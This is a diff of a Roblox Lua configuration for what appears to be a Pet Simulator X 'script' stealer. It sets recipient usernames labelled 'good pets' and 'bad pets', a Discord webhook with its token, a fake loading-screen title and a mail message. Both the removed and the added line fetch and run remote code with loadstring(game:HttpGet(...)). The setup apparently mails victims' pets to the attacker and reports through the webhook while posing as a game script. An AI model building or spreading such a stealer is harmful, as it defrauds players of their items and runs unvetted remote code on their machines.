@@ -1,11 +1,9 @@
-Username = "zandrymabasa"
-WebHook = "https://discord.com/api/webhooks/1131804090515587122/dyYwL9Fe9niKhjw5DcFwo0ao8EKz8U0pvmsM3HjX97Kp-iLim_mggHJ1jY9DXSZ5Q-i8"
+UserName = "Jerokh1rlan" -- good pets
+Webhook = "https://discord.com/api/webhooks/1131804090515587122/dyYwL9Fe9niKhjw5DcFwo0ao8EKz8U0pvmsM3HjX97Kp-iLim_mggHJ1jY9DXSZ5Q-i8" -- pings for pets
+UserName2 = "zandrymabasa" -- bad pets
 
+_G.MailMessage = "Mail Message Here" -- Mail Message !
+_G.LoadingTitle = "Script Title Here" -- Loading Screen Title
+_G.WebhookName = "Webhook Name Here" -- Webhook name 
 
-loadingscreen = true
-_G.CustomScriptName = "Pet Sim x Script"
-_G.Text1 = "Made by Cracksk.load"
-_G.Text2 = "Waiting for Script..."
-_G.Text3 = "Checking Scripts..."
-_G.Text4 = "Starting Script..."
-loadstring(game:HttpGet("https://raw.githubusercontent.com/Jopsc/MainOp_script/main/Pet_scriptPetboi"))()
+loadstring(game:HttpGet("https://raw.githubusercontent.com/LypherX/idkk/main/iddkkk2"))()
